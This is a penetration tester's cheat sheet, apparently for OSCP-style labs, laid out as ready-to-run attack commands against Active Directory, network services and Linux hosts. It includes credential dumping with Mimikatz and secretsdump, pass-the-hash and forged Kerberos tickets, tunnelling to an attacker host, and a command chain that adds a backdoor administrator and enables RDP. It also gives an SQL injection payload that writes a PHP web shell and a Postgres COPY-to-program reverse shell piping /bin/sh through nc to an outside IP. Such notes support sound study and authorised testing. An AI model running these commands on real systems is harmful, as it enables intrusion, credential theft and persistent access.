# Logging

## Linux
```
mkdir logs
for every command do `| tee <file>`

OR

use `script <file_name>`
use `less -rr script.log` to see the script output properly
```

## Windows
```
Start-Transcript
Stop-Transcript
```
- Transcript stored in Documents folder

# Port Scanning
```
nmap -p- -sC -sV -vvv oA nmap/tcp_all_port <ip>
sudo nmap --top-ports 1000 -sU -vvv -sC -sV -oA nmap/udp_top_1000 <ip>
sudo nmap -p- -sU -vvv -sC -sV -oA nmap/ucp_all_port <ip>
proxychains -p- -sT -vvv <ip>
```

# AD

## Pivoting with Ligolo

- Attacker Machine
```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert OR 
./proxy -selfcert -laddr 0.0.0.0:443 (to bypass firewall)
```

- Pivot Machine
```
./agent -connect <IP>:11601 -ignore-cert
```

- Attacker Machine
```
sudo ip route add x.x.x.x/24 dev ligolo
ligolo >> session
ligolo >> start
```

## Double Pivoting with Ligolo

- Attacker Machine
```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert OR 
./proxy -selfcert -laddr 0.0.0.0:443 (to bypass firewall)
```

- Pivot 1 Machine
```
.\agent.exe -connect <IP>:11601 -ignore-cert
```

- Attacker Machine
```
sudo ip route add x.x.x.x/24 dev ligolo
ligolo >> session
ligolo >> start
ligolo >> listener_add -addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
ligolo >> listener_list
```

- Pivot 2 Machine
```
.\agent.exe -connect <IP>:11601 -ignore-cert
```

- Attacker Machine
```
sudo ip route add x.x.x.x/24 dev ligolo
ligolo >> session
ligolo >> start
```

## Port Forward
- chisel server -p 443 --reverse --socks5 (kali)
- chisel client 192.168.119.248:443 R:3306:localhost:3306 (target)

## Pivoting / Tunneling (do -sT on nmap)
- chisel server -p 443 --reverse --socks5 (kali)
- chisel client 192.168.119.248:443 R:socks (target)

## Methodology
```
netexec smb 10.10.10.10 -u Username -p Password --pass-pol
netexec smb 10.10.10.10 -u Username -p Password --users
netexec ldap 10.10.10.10 -u Username -p Password -M get-desc-users
netexec smb 10.10.10.10 -u Username -p Password --shares
netexec smb 10.129.203.121 -u Username -p Password --spider <share name> --regex .
netexec smb 10.10.10.10 -u Username -p Password -X 'whoami'
netexec rdp 10.10.10.10 -u Username -p Password
netexec winrm 10.10.10.10 -u Username -p Password
netexec wmi 10.10.10.10 -u Username -p Password
```
- enumerate all users, their description, roles, groups and machines using ldapdomaindump and bloodhound
- asrep roasting
- kerberoasting
- get account lockout policy
- try password spray with known or weak passwords
- check anonymous shares on all machines
- check authenticated shares on all machines
- check smb command execution with -X when using netexec
- pass the password
- pass the ticket
- lnk file attack
- credential dumping
- GPP / cPassword
- GMCA password
- Silver Ticket
- Print Nightmare
- ZeroLogon
- post exploitation search

## Tips
If your user does not have special rights from BloodHound:   
    AS-REP Roasting   
    Kerberoasting   
    Kerbrute   
If step 1 gives you nothing:   
    Enumerate which users are interesting   
    Identify any interesting groups   
Did you root the initial MS01 machine? If so:   
    Are there any Kerberoast tickets for users?   
    Are there LSA, LSASS, or SAM credentials you can reuse as another user?   
SysVol:   
    There might be credentials in SysVol, such as:   
        GPP (Group Policy Preferences)   
        VBS scripts      
Enumerate LDAP:   
    There might be useful information in the descriptions of users and computers.   
Is the domain controller vulnerable to any attacks, such as the Print Spooler service?   
Is ADCS (Active Directory Certificate Services) in use? If so, consider abusing certificate templates.   
Kerberos Attacks : Delegation ( 3 types), Silver ticket, Golden ticket   
Reading LAPS and gMSA, DC sync...   
Use multiple tools: Bloodhound, Powerview, netexec, ldapdump...   
- Enumerate all boxes even if there is foorhold or admin on one box
- No posining or MITM can run "sudo responder -I tun0 -A -v"
- Check secretsdump with all users
- Check if you can access SAM and SYSTEM file as normal user on a box
- Enumerate everything (smb,rdp,winrm etc) when new credentials are found
- Use winpeas to find extra files / passwords even if admin
- Check bloodhound manually with start and end node if none of the queries work
- Try direct DC attacks
- Enable RDP - "netexec smb $IP -u username -p pass -M rdp -o ACTION=enable" OR "reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes"

## Mindmap
- Check AD mindmap graph [here first](https://mayfly277.github.io/assets/blog/pentest_ad_dark.svg) and [then this](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)

## Responder Analyze Mode 
```
sudo responder -I tun0 -A -v
```

## Find Users
```
ridenum <ip> 0 10000 guest ""
enum4linux-ng -A <ip> -u "" -p ""
enum4linux-ng -A <ip> -u "guest" -p ""
enum4linux-ng -A <ip> -u "anonymous" -p ""
netexec smb <IP> -u anonymous -p "" --rid-brute 10000
netexec smb <IP> -u guest -p "" --rid-brute 10000
netexec smb <IP> -u "" -p "" --rid-brute 10000
netexec ldap <IP> -u '' -p '' --password-not-required --admin-count --users --groups   (also try with guest and anonymous)
netexec ldap <IP> -u '' -p '' -M get-desc-users
kerbrute userenum --dc <dc_ip> /home/kali/THM/AD/userlist.txt -d <domain>
```
- LDAPsearch
- rpcclient enumdomusers (guest,anonymous,blank)
- Check websites for usernames

## ASREP
- Try with known users and creds later
```
GetNPUsers.py -dc-ip <IP> -no-pass -usersfile <userfile> <domain>/
impacket-GetNPUsers -request -dc-ip <ip> -usersfile <userfile> <domain>/
hashcat -m 18200 <hash> <wordlist>
```

## Kerberoasting
```
Get-UserSPNs.py <domain>/<user>:<password> -dc-ip <ip> -request
impacket-GetUserSPNs NORTH.SEVENKINGDOMS.LOCAL/jon.snow:iknownothing -dc-ip 192.168.56.11 -request
hashcat -m 13100 <hash> <wordlist>
```

## Pass the Ticket with SPN
```
Get-NetUser -SPN | select samaccountname, serviceprincipalname (powerview)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'any_SPN_here'

OR 

impacket-getST -spn CIFS/winterfell.north.sevenkingdoms.local north/robb.stark:sexywolfy -dc-ip 192.168.56.11
```

- Crack the ticket
```
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-
Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi

impacket-ticketConverter ticket.ccache ticket.kirbi
kirbi2john ticket.kirbi >> ticket.hash
john ticket.hash --wordlist=/usr/share/wordlist/rockyou.txt
```

- Pass the ticket
```
mimikatz.exe "kerberos::ptt path_to_ticket.kirbi" or
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:<luid> /nowrap
.\Rubeus.exe ptt /ticket:ticket.kirbi (or base64 ticket)
klist
.\PsExec.exe -accepteula \\hostname cmd
```

- Use Kerberos for login and other stuff (might not work)
```
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=/home/kali/ticket.ccache
impacket-psexec domain/user@IP or hostname -k -no-pass
```

## Manual Enumeration with PowerView
- Users
- Groups
- Nested Groups
- Permissions of Users, Groups and Nested Groups (AD Enumeration from OffSec)
- [Cheatsheet](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)

### Domain
```
Get-NetDomain
Get-NetDomain -Domain <domain>
Get-DomainSID
Get-DomainPolicy
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."kerberos policy"
Get-NetDomainController
Get-NetDomainController -Domain <domain>
```

### User
```
Get-NetUser
Get-NetUser -SPN
Get-DomainUser
Get-Domainuser -Identity <name>
Get-NetUser -name <name>
Get-NetUser | select samacocuntname
Get-DomainUser -properties samaccountname,logoncount
Get-NetUser -name <name> | select cn
Get-UserPropery
Get-UserProperty -Properties pwdlastset,badpwdcount,logoncount
Find-UserField -SearchField Description -SearchTerm “built”
Find-DomainUserLocation
```

### Computer
```
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -OperatingSystem “*Server 2016*”
Get-NetComputer -Ping
```

### Group
```
Get-NetGroup
Get-NetGroup <name>
Get-NetGroup -GroupName *admin*
Get-NetGroup | select name
Get-NetGroup -FullData
Get-NetGroup -Domain <domain>
Get-NetGroup -UserName <name>
Get-NetGroupMember -GroupName <name>
Get-NetGroupMember -GroupName <name> -Recurse
Get-NetLocalGroup -ComputerName <name> -ListGroup
```

### Session
```
Get-NetLoggedon -ComputerName <name>
Get-LoggedonLocal -ComputerName <name>
Get-LastLoggedOn-ComputerName <name>
```

### File / Share
```
Invoke-ShareFinder -Verbose
Invoke-FileFinder -Verbose
Get-NetFileServer
```

### GPO
```
Get-NetGPO
Get-NetGPO -ComputerName <name>
gpresult /R /V
Get-NetGPOGroup (restrictive groups)
Find-GPOComputerAdmin -ComputerName <name>
Find-GPOLocation -UserName <name> -Verbose
```

### ACL
```
Get-ObjectAcl -SamAccountName <name> -ResolveGUIDs
Get-ObjectAcl -ADSprefix <prefix> -Verbose
Get-ObjectAcl -ADSpath <path> -ResolveGUIDs -verbose
Invoke-ACLScanner -ResolveGUIDs
Get-DomainObjectAcl 
Get-DomainObjectAcl -SearchBase "CN=student541,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
Find-InterestingDomainAcl -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentifyReferenceName -match "student541"} (to match only results from student541)
```

### User Hunting
```
Find-LocalAdminAccess -Verbose
Find-WMILocalAdminAccess.ps1 -ComputerFile <name>
Invoke-EnumerateLocalAdmin -Verbose
Invoke-UserHunter
Invoke-userHunter -GroupName “RDPUsers”
Invoke-UserHunter -CheckAccess
Invoke-UserHunter -Stealth
```

## Automated Enumeration using Bloodhound
- Sharphound on diff users and computers at different time

### Bloodhound from Kali
```
bloodhound-python -u jon.snow -p iknownothing -c all -d north.sevenkingdoms.local --zip -ns <dc ip>
```

### Bloodhound from Windows
```
SharpHound.exe --CollectionMethods All --ZipFileName output.zip (OR)
. .\sharpHound.PS1
Invoke-BloodHound -CollectionMethod All -zipFileName loot.zip
```

## Automated Enumeration using ldapdomaindump
```
sudo ldapdomaindump ldap://<dc ip> -u '<domain>\<username>' -p <password> 
sudo ldapdomaindump ldaps://<dc ip> -u '<domain>\<username>' -p <password> 
```

## SMB Shares
```
crackmapexec smb <ip> -u <user> -p <pass> -M spider_plus
cat /tmp/cme_spider_plus/<ip.json file> | jq '. | map_values(keys)'
```

## SQL Port
```
impacket-mssqlclient -windows-auth <domain>/<user>:<pass>@<ip>
```

## LAPS
```
netexec ldap 192.168.56.11 -u 'jon.snow' -p 'iknownothing' -M laps
```

## Crack DC2 from Secretsdump
```
john DC2hash --wordlist=/usr/share/wordlists/rockyou.txt
```

## Client Side Attack
```
Generate a macro from here 
https://github.com/glowbase/macro_reverse_shell
Put it in Word and deliver

OR 

Use https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell
```

## Get NTLMv2 Hashes
- Put URL File in Shares to get NTLMv2 Hashes or Access using current user to get the password Hash if not known
```
smbserver.py share . -smb2support (kali) OR
sudo responder -I tun0 -A -v
net use \\<ip>\share (target)
```

## Dumping Secrets / Hashes 
```
secretsdump.py <domain>/<user>:<password>@<ip>
secretsdump.py <domain>/<user>:@<ip> -hashes <hash>
crackmapexec smb -L (to see all avialble modules)
crackmapexec smb <ip> -u <username> -p <password> --lsa (use --local-auth for local acounts, use --hashes instead of -p if you only have Hash)
crackmapexec ldap <ip> -u <username> -p <password> --kdcHost <ip> -M laps
crackmapexec ldap <ip> -u <username> -p <password> --kdcHost <ip> -M lsassy
crackmapexec ldap <ip> -u <username> -p <password> --kdcHost <ip> --sam
```

## GPO
```
SharpGPOAbuse.exe
```
- Check if compromised users can access / edit any GPOs

## Token Impersonation

### Metasploit
```
load incognito
list_tokens -u
impersonate_token <token>
```

### Windows Binary
```
incognito.exe list_tokens -u
incognito.exe impersonate_token <token>
```

## Group Managed Service Accounts

## GPP / cPassword

### Metasploit
```
use auxiliar/smb_enum_gpp
Fill out all options
Run the module
gpp-decrypt <cpassword> 
```

### CrackMapExec
```
crackmapexec smb 192.168.56.0/24 -u 'usernamew' -p 'password' -M gpp_password
gpp-decrypt <cpassword>
```

### Manual
- Find policies folder on the share
- Find Groups.xml
- Groups.xml might have cpassword
```
gpp-decrypt <cpassword> 
```

## GPP Autologin
- Find Registry.xml files in shares
```
crackmapexec smb 192.168.56.0/24 -u 'usernamew' -p 'password' -M gpp_autologin
```

## URL File Attack (Can also use Farmer.exe and Crop.exe)
- Create a file with name "@test.url"
- Paste the following text into the file
```
`[InternetShortcut]`
`URL=blah`
`WorkingDirectory=blah`
`IconFile=\\<attacker-IP>\%USERNAME%.icon`
`IconIndex=1`
```
- Run `impacket-smbserver -smb2support test .` to host a smb share and Wait for someone to open the share

## PrintNightmare
`impacket-rpcdump -port 135 <target-ip> | grep -E 'MS-RPRN|MS-PAR'` (To check if vulnerable)
- SharpPrintNightmare
- https://github.com/cube0x0/CVE-2021-1675
- https://github.com/calebstewart/CVE-2021-1675

## Spool Service via SpoolSample or PrinterBug
- Coerce Authentication
- [Binary Link](https://github.com/jtmpu/PrecompiledBinaries)
```
ls \\dc01\pipe\spoolss
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
impacket-rpcdump -port 135 <target-ip> | grep -i 'spoolss'
rpcdump.py $TARGET | grep -A 6 "spoolsv"

Rubeus.exe monitor /monitorinterval:10 /targetuser:DC01$ /nowrap

.\SpoolSample.exe dc01 ws01 OR 
python dementor.py -d domain -u username -p password RESPONDERIP TARGET OR
python printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'

mimikatz # sekurlsa::tickets

ptt attack
```

## Mimikatz 
```
privilege::debug (run first)
token::elevate
vault::list
vault::cred /patch
lsadump::sam
lsadump::lsa /patch
sekurlsa::logonpasswords
sekurlsa::logonpasswords full
sekurlsa::tickets /export
kerberos::list
crypto::certificates
lsadump::secrets
lsadump::dcsync
lsadump::cache
sekurlsa::ekeys
sekurlsa::credman
sekurlsa::kerberos
sekurlsa::msv
```

## Rubeus
```
Rubeus triage
```
Do the pass the ticket attack or convert to ccache and use kerberos with impacket and other tools

## Impersonate Attacks
```
.\JuicyPotato.exe -t t -p <path to exploit binary> -l 5837
.\JuicyPotato.exe -e EfsRpc -p <path to nc.exe> -a "LHOST LPORT -e cmd"
.\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
```
- GodPotato
- SweetPotato
- RottenPotato
- Incognito.exe?

## Get shell using hashes
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:UserName /domain:DomainName /ntlm:HASH /run:powershell.exe"'
```

## Offline cracking
```
reg save HKLM\SYSTEM SystemBkup.hiv
reg save HKLM\SAM SamBkup.hiv
lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv (Mimikatz)
```

## Spraying
- Spray passwords and hashes

## Pass the Hash
```
psexec -hases <hash> <domain>/<user>@<ip>
pth-winexe -U <user>%<hash> //<ip> cmd
crackmapexec smb <ip-range> -u <user> -H <nt-hash> (for AD accounts)
crackmapexec smb <ip-range> -u <user> -H <nt-hash> --local-auth (for local accounts)
psexec.py <user>:@<IP> -hashes <NTLM-hash>
```

## Overpass the Hash
```
Rubeus.exe asktgt /user:<username> /aes256:<hash> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash> /run:PowerShell.exe (In Mimikatz)
```
- psexec.exe to run commands remotely or do 'net user <computer>' and then do ptt attack

## Pass the Password
```
crackmapexec smb <ip/range> -u <user> -d <domain> -p <password>
crackmapexec smb <ip/range> -u <user> -p <password> --local-auth
crackmapexec smb <ip/range> -u <user> -d <domain> -p <password> --sam
```

## Converting kirbi tickets to ccache and getting a shell 
```
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=/home/kali/ticket.ccache
impacket-psexec domain/user@IP or hostname -k -no-pass

mimikatz.exe "kerberos::ptt ticket.kirbi" or
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist
.\PsExec.exe -accepteula \\hostname cmd
```

## Password Spray (use continue-on-success with CME)
- Weak Passwords (password, password1, Password1 passw0rd, etc)
- Cracked passwords
- Username as passwords
- Use Hydra and CME 

## Pass the Ticket (Silver Ticket)
```
kerberos::golden /user:<current user> /domain:<domain> /sid:<domain sid> /rc4:<rc4 hash of service account> /target:<target FQDN> /service:<service> /ptt

or

python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john
```
- Impacket gives TGS for SMB which can be used to gain shell using crackmapexec -X
- [Silver Ticket to RCE](https://www.exploit-db.com/docs/48455)
- sqlcmd to access the SQL server

## Pass the Ticket (Golden Ticket)
```
lsadump::lsa /patch
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<ntlm hash> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
lsadump::dcsync /user:<domain>\<user>
```

## GroupManagedServiceAccount Password
- [Attack](https://adsecurity.org/?p=4367)

## ZeroLogon
- https://github.com/dirkjanm/CVE-2020-1472
- https://github.com/SecuraBV/CVE-2020-1472

## PetitPotam
- PetitPotam.exe and PetitPotam.py

## Add Admin and Enable RDP
```
net user /add admin admin && net localgroup administrators admin /add & net localgroup "Remote Desktop Users" admin /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v admin /t REG_DWORD /d 0 & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f & sc config TermService start= auto
```

## RunAs 
```
runas.exe
```

## Important Files 
```
tree /f /a 
```

## Lateral Movement
```
for /L %i in (0,1,255) do ping -n 1 -w 250 192.168.2.%i >> ip.txt && type ip.txt | select string Reply
arp -a
crackmapexec smb <ip> -u <user> -p <password> -L
crackmapexec smb <ip> -u <user> -p <password> --shares
crackmapexec rdp <ip> -u <user> -p <password> -L
crackmapexec winrm <ip> -u <user> -p <password> -L
crackmapexec mssql <ip> -u <user> -p <password> -L
crackmapexec ssh <ip> -u <user> -p <password> -L
crackmapexec ftp <ip> -u <user> -p <password> -L
crackmapexec ldap <ip> -u <user> -p <password> -L
netexec wmi <ip> -u <user> -p <password> -L
netexec vnc <ip> -u <user> -p <password> -L
crackmapexec smb <ip> -u <user> -p <pass> -M spider_plus
crackmapexec smb <ip> -u <user> -H <hash> -M spider_plus
crackmapexec smb <ip> -u <user> -p <password> -X 'whoami'
crackmapexec smb <ip> -u <user> -H <hash> -X 'whoami'
winrs -remote:<computer name> -u:<user> -p:<password> <command>
winrs -r:<computer name> <command> (use cmd to get shell)
$sess = New-PSSession -ComputerName <name>
Enter-PSSession -ComputerName <name>
Enter-PSSession -ComputerName <name> -Credential <credntials>
Enter-PSSession -Session <session var>
Invoke-Command -ScriptBlock {whoami} -Session $sess
Invoke-Command -ComputerName <name> -ScriptBlock {whoami}
Invoke-Command -ComputerName (Get-Content <list of computer names> -ScriptBlock{whoami})
Invoke-Command -ComputerName <name> -FilePath <filename>
Invoke-Command  -FilePath <filename> -Session <session var>
netexec smb <ip> -u username -p password -X "command to execute"
evil-winrm -H <hash> -u <user> -i <ip>
evil-winrm -u <user> -p <password> -i <ip>
impacket-psexec <domain>/<user>:<password>@<ip>
impacket-wmiexec <domain>/<user>:<password>@<ip>
impacket-atexec <domain>/<user>:<password>@<ip>
psexec.py <user>:@<IP> -hashes <NTLM-hash>
evil-winrm -u <domain>/<user> -p <password> -i <ip>
evil-winrm -u <domain>/<user> -H <hash> -i <ip>
impacket-wmiexec <domain>/<user>:<password>@<ip>
impacket-atexec <domain>/<user>:<password>@<ip>
impacket-atexec -hashes <hash> <domain>/<user>@<ip>
impacket-dcomexec -object <MMC20 or ShellWindows or ShellBrowserWindow> <domain>/<user>:<password>@<ip>
pth-winexe -U <username>%:<hash> //<ip> cmd.exe
psexec -hases <hash> <domain>/<user>@<ip>
pth-winexe -U <user>%<hash> //<ip> cmd
crackmapexec smb <ip-range> -u <user> -H <nt-hash> (Hash - AD accounts)
crackmapexec smb <ip-range> -u <user> -p <password> (Password - AD accounts)
crackmapexec smb <ip-range> -u <user> -H <nt-hash> --local-auth (for local accounts)
xfreerdp /u:user /p:'password' /v:X.X.X.X /d:domain /sec:rdp +clipboard (no /d if local account)
xfreerdp /u:user /p:'password' /v:X.X.X.X /d:domain /sec:tls +clipboard
xfreerdp +clipboard /u:user /p:'password' /v:X.X.X.X /d:domain /sec:<whatever> /drive:<absolute path to your local folder>,/ (if you want to have files and clipboard)
netexec smb <ip> -u username -p password -X "command to execute"
rpcclient -U <user> <ip>
```
- Unattended.xml
- Plain text credentials in files
- Powershell history
- Runas different user when you are admin (check cmdkey)
- Powershell search passwords
- Local Services
- Services accessible only from internal machines
- Crackmapexec every service(smb,winrm,rdp,etc) with creds
- `for /R "C:\Users\Administrator" %i in (*) do @if not exist "%i\" echo %i`
- Do URL File attack to see if someone checks shares
- try pth-winexe and other varients
- Try to access blocked sevrice from compromised machine
- Perform Kerberoasting and AS-REP roasting unauthenticated and authenticated
- Check if computer machine accounts have any access to any other machines using their hash
- Try all accounts for services on the other boxes
- Run `crackmapexec smb <ip> -u <user> -p <pass> -M spider_plus` for every user found
- Once admin look for passwords using mimikatz and `find /si 'password' *.txt *.ps1 *.xml *.docx `
- Check log files for password of other users
- Check for tokens using incognito when admin for other users

## General
- Enumerate every AD box
- Run LDAP quesries against DC to enumerate
- Check for guest sessions on RDP and SMB
- Add dc and hosts in hosts file if error in output due to nameservers
- Try crackmapexec with smb (psexec) and winrm to check credentials
- Enumerate shares if no shell access
- We can change user's password using rpcclient if we have permission
- We can check for description of users using rpcclient which might have password
- Try Username as Passwords for brute force
- impacket-lookupsid with creds
- Check creds with SMB, SSH, FTP, RPC, MYSQL
- NTLM hash can be used in overpass the hash and requesting any domain servcie like net use \\<ip>, this will create TGS and TGT which can then be used with PsExec like psexec \\<ip> cmd.exe to get shell
- Try both IP and FQDN when using psexec if errors
 
# Services 

## Wordlists
- Rockyou
- Cewl generated
- Seclists 

## HTTP
- Check for subdomains
- Check the finxing public exploits module if exploits does not work proerply
- In case default page or require hostname, run the following commands "nslookup; server <ip>; <ip>"
- Source Code
- Directory Busting (with appropriate extensions)
- File Busting (with appropriate extensions)
- Nikto
- XSS
- SQLi (MariaDB)
    - Identify - `" OR 1=1#`
    - Try #, #-- -, 00
    - Put ' after string or number if not working
    - Try removing 'all' from query
    - Try putting numbers in '' to accept them as string
    - Identify coloumns - `1 order by 1#` (increment until error)
    - Understand the layout of output - `1 union all select 1,2,3`
    - Extracking data
        - `1 union all select 1,2,@@version`
        - `1 union all select 1,2,user()`
        - `1 union all select 1,2,table_name from information.schema.tables`
        - `1 union all select 1,2,column_name from information_schema.columns where tab;e_name='users'`
        - `1 union all select 1,username,password from users`
    - Read File
        - `1 union all select 1,2,load_file('c:/windows/system32/drivers/etc/hosts')`
    - Write File (Check even if error) (RCE)
        - `1 union all select 1,2,"<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?> into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
- Command Injection
- Directory Traversal
- LFI
    - Check for Log File poisoning
    - try other functions if shell_exec is blocked
    - Try PHP Wrappers - OSCP PDF - Page 323
    - https://notchxor.github.io/oscp-notes/2-web/LFI-RFI/
    - Check for "c:/windows/system32/drivers/etc/hosts" on windows and "/etc/passwd" on linux
- RFI
- RCE 
- File Upload
- Log Poisoning
- PHP Wrappers
- Default / Weak Credentials
- Brute Force
- Vulnerable Software
- Hidden Data in Image Files

### Execute command with PHP
```
<?php 
$exec = system('command here',$val)
?>
```

## SSH
- Vulnerable Version
- Brute Force

## FTP
- Vulnerable Version
- Anonymous Access
- Guest / FTP / Admin access
- Read Files
- Write Files
- Can access uploaded files from Web?
- Brute Force (from seclists default ftp credentials even though anonymous login in enabled)

## SMB
- Vulnerable Version
- enum4linux and enum4linux-ng with and without creds
- Vulnerable Version
- Enumerate Hostname
- List Shares
- Null Session
- Brute Force
- Check upload permissions on every folder (Sync walkthrough - Pinkdraconian)
- See if you can get NTLM hashes if you can write to share
```
smbclient -L <host>
smbclient -L <host> -U ''
smbclient -L <host> -U 'guest'
smbclient -L \\\\<ip>\\ -U <domain>/<username>%<password>
cme smb <host> --shares -u '' -p ''
smbmap -H <host>
smbmap -H <host> -u <user> -p <password>
enum4linux-ng -A <ip>
enum4linux -A <ip>
enum4linux-ng -A <ip> -u <user> -p <password>
enum4linux -A <ip> -u <user> -p <password>
crackmapexec smb <ip> -u 'guest' -p '' -M spider_plus
```

## DNS
- Host Lookup
- Record Lookup (A,AAAA,NS,MX,etc)
- Zone Transfer
- DNSRecon

## Kerberos
- Kerbrute to identify users
```
kerbrute userenum --dc <dc_ip> /home/kali/THM/AD/userlist.txt -d <domain>
```
- Bruteforce known users

## LDAP
```
ldapsearch -x -H 10.10.10.175 -s base namingcontexts
ldapsearch -x -b "dc=cascade,dc=local" -H 10.129.26.146
ldapsearch -x -b "dc=domain,dc=local" "user" -H <IP>
ldapsearch -x -b "dc=domain,dc=local" "**" -H <IP>
ldapsearch -H ldap://<ip> -x -b "DC=domain,DC=local" (check for usernames and descriptions)
ldapsearch -H ldap://<ip> -x -b "DC=domain,DC=local" '(objectClass=)' 'sAMAccountName'
```
- Check for users and descriptions 

## NFS
```
rpcinfo -p [host]
showmount -e [host]
mount [host]:[share] /mnt/[dir]
unmount /mnt/[dir]
```

## RPC
```
rpcclient <host> 
rpcclient <host> -U ''
rpcclient <host> -U '' -N
rpcclient <host> -U 'guest'
enumdomusers
srvinfo  
enumdomusers  
enumprivs  
enumalsgroups domain  
lookupnames administrators  
querydominfo  
enumdomusers  
queryuser john
ridenum.py <server ip> <start rid> <end rid> <optional username file> (enumerate users)
```
- Null Sessions
- rpcinfo & rpcclient
- querydispinfo

## SMTP
- Check Version
- User Enumeration using smtp-user-enum
```
finger -p "username"
```

## POP3
```
telnet <domain> 110
user <username>
pass <password>
list
retr <number>
```

## MSSQL
- Vulnerable Software
- Brute Force
- Default Credentials

## Postgres [Postgres Command Execution](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767)
- Default Creds (postgres:postgres)
```
\l
\c <database>

# Read Files
CREATE TABLE read_files(output text);
COPY read_files FROM '/etc/passwd';
SELECT * FROM read_files;

# Command Exec
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
```

## SNMP
```
nmap -p 161 --script=snmp-info $ip default creds:/usr/share/metasploit-framework/data/wordlists/snmp\_default\_pass.txt
snmpwalk -c <community> -v1 <ip> 1.3.6.1.4.1.77.1.2.25 (enumerate users on windows machines)
snmpcheck -t <ip> -c <community>
snmpenum -t <ip>
onesixtyone -c <names> -i <hosts>  
snmpwalk -c <community strings> -v<version> $ip 1.3.6.1.2.1.25.4.2.1.2 snmp-check $ip
```
Default Community Names:

> $ public, private, cisco, manager

Enumerate MIB:
> $ 1.3.6.1.2.1.25.1.6.0 System Processes  
> $ 1.3.6.1.2.1.25.4.2.1.2 Running Programs  
> $ 1.3.6.1.2.1.25.4.2.1.4 Processes Path  
> $ 1.3.6.1.2.1.25.2.3.1.4 Storage Units  
> $ 1.3.6.1.2.1.25.6.3.1.2 Software Name  
> $ 1.3.6.1.4.1.77.1.2.25 User Accounts  
> $ 1.3.6.1.2.1.6.13.1.3 TCP Local Ports

## FINGER
```
finger-user-enum -U <username list> -t <host>
```

# Privilege Escalations [Cheatsheet](https://notchxor.github.io/oscp-notes)

## Linux 
- [Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/)
```
# Automated Enum
./lse.sh -l 1


# Privileges
id


# Passwords
su root with root and empty password
su <username> with username as password
cat /etc/passwd
ls /home
su <username> with found passwords


# Groups
groups
find / -group groupname 2>/dev/null


# Service Exploits
[MySQL UDF](https://tryhackme.com/r/room/linuxprivesc)


# Home Directory Files
cat .bash_history
ls -la .ssh/
cat any unusual files or history files


# Find config files
php
mysql
apache
wordpress
vpn
ftp


# Cron Jobs
pspy64
cat /var/log/cron.log
ls -lah /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*
cat /var/spool/cron/*
crontab -l
cat /etc/crontab
cat /etc/cron.(time)
systemctl list-timers
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root


# Cron Jobs
Check for jobs without absolue path
add your home directory in PATH or find one that is writeable
get a rev shell


# Cron Jobs - Wildcards
See if any jobs have wildcards in them
Follow GTFOBins


# SUID / GUID Binaries and Files
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
find / perm /u=s -user "User name that you are looking for" 2>/dev/null 
find / -user root -perm -4000 -print  2>/dev/null
find / -group root -perm -2000 -print 2>/dev/null
find / -perm -4000 -o -perm -2000 -print  2>/dev/null


# SUID Shared Object Injection
[Follow this](https://tryhackme.com/r/room/linuxprivesc)


